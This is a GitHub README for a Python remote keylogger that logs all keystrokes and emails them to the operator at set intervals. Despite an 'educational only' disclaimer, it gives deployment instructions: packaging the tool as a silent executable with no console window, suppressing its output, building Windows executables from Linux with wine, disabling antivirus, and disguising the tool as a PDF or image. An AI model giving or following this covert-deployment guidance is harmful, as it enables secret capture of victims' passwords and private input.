# PythonKeylogger
Tanit Keylogger is a simple but powerfull remote python keylogger for MS Windows, Mac OS and Linux OSs. The tool is named after the Phoenician chief goddess of Carthage. The tool sends you a report to your email every specific amount of time. Please change these parameters in main.py.

The tool is an Ethical Hacker Educational tool ONLY  (please code of conduct). 

It is part of a series of Ethical Hacking tools I will publish on Github:
1. Adonis ARP Spoofer (Language Python), repository URL (will be added later).
2. Simple MAC Changer (Language Python), repository URL (will be added later).
3. Anat Network Scanner (Language Python), repository URL (will be added later).
4. Hadad Keylogger (Language Python), repository URL (will be added later).
5. Shahar DNS Spoofer (Language Python), repository URL (will be added later).
6. Sweet Death Virus (Language Python), repository URL (will be added later).
7. Baal Backdoor (Language Python), repository URL (will be added later).
8. Sanctum Website Crawler (Language Python), repository URL (will be added later).
9. Tanit Keylogger (Language Python) - current repository.


# Code of Conduct
**I wrote this tool after taking several Ethical Hacking and security courses. So it is a tool written to teach how keyloggers work and it really shows how much it is simple to write an effective keylogger in Python. This tool is for educational purposes only and is not meant to be used in any harmfull way. Actually I was going to address antiviruses evation in a seperate section in the documentation (since your executable will be immediately detected and deleted by any good antivirus) but I decided not to do so (I might change my mind later).  The point I am driving home here is that this tool is meant to be a tool to be studied by white hackers and security specialists not to be deployed againt victims.**

# Description
A python Remote keylogger that logs all keystrokes that have been typed by a user and then sends a report to an email every specific amount of time. You can package it as an executable for MS Windows, Linux OSs, and Mac OS. Please refer to the section called Packaging where I explain how to do that in detail. Enjoy!

# Requirements
You need to install pynput Python module. You can install it by pip or any other method you are confortable with:
```
pip install pynput
```

# Usage 
## Irrealistic usage (educational)

```
python main.py 
```
## Deployment Usage
You need to package the source code as executable for your target Operating System (please see packaging). Please change the time interval and email to suit your needs in main.py. Black hackers normally use trojan horse techniques to masquerade the tool as a legitimate application so that the user will not be suspicious and would click to the run the application which could look like a PDF or image or anything really.

# Packaging
You need the pyinstaller. You can install it via pip or pip3 or via apt vel cetera
```
pip install pyinstaller
```

A program called pyinstaller is installed in the Python directory. On Windows it would be an executable: pyinstaller.exe

## Note Bien - Antivirus won't be happy!!!

Please turn off any antivirus since the executable will be detected and the antivirus will try to delete or quarantine it. I might address antivirus evasion :-)

```
pyinstaller main.py --onefile
```
--onefile means  pyinstaller will package all the python files into a single executable

## How to package and run an excutable silently
If you do not want the user to see a command prompt after the exe is run. You can add another argument called
--noconsole

```
pyinstaller main.py --onefile --noconsole
```

This can work in almost all instances except when your Python code deals with standard input/output/error 

You have to explitely to deal with standard error and standard input so per example if we have something like (just an example)
```
result = subprocess.check_output(command, shell=True)
```

You need to handle the stderr and stdin by throwing them in the Abyss

### For Python 3
```
result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL )
```
### For Python 2 (you need to import the os module)
```
DEVNULL = open(os.devnull, 'wb')
result = subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL )
```

## Create a Windows .exe of a python project from Linux OS
As you know to run a Windows .exe or .msi or anything similar on a Linux OS you need a lovely program called wine (https://www.winehq.org/). I would assume you have installed wine. Go to the official Python Website and download a Python 2.7.x msi installation files. Navigate on your Linux to the directory of the download directory and then run the following command: (/i is for installing):
```
wine msiexec /i python-2.7.14.msi
```
You will get a normal installation process as you would have on MS Windows, please follow the steps needed. All Programs are usually installed in wine in a hidden folder called '.wine' in the Home Folder. So probably your Windows Python will be 
installed in ~/.wine/drive_c/Python27/ and in there all the cool stuff like Python.exe .... Naviagate to this folder and run via wine the Python interpreter invoking pip in order for you to install as above the 'pyinstaller'.
```
cd ~/.wine/drive_c/Python27/
wine python.exe -m pip install pyinstaller
```
You will find the pyinstalller.exe in the Scripts directory.
To install pynput (why? you need to do that as even this module is installed on Linux OS, the Windows Python interpreter needs this)
```
wine python.exe -m pip install pynput
```

You can then package Tanit Keylogger into a single executable:

```
wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe main.py --onefile --noconsole
```

# License
This program is licensed under GNU GPL v3 License - you are free to distribute, change, enhance and include any of the code of this application in your tools. I only expect adequate attribution of this work. The attribution should include the title of the program, the author and the site or the document where the program is taken from.

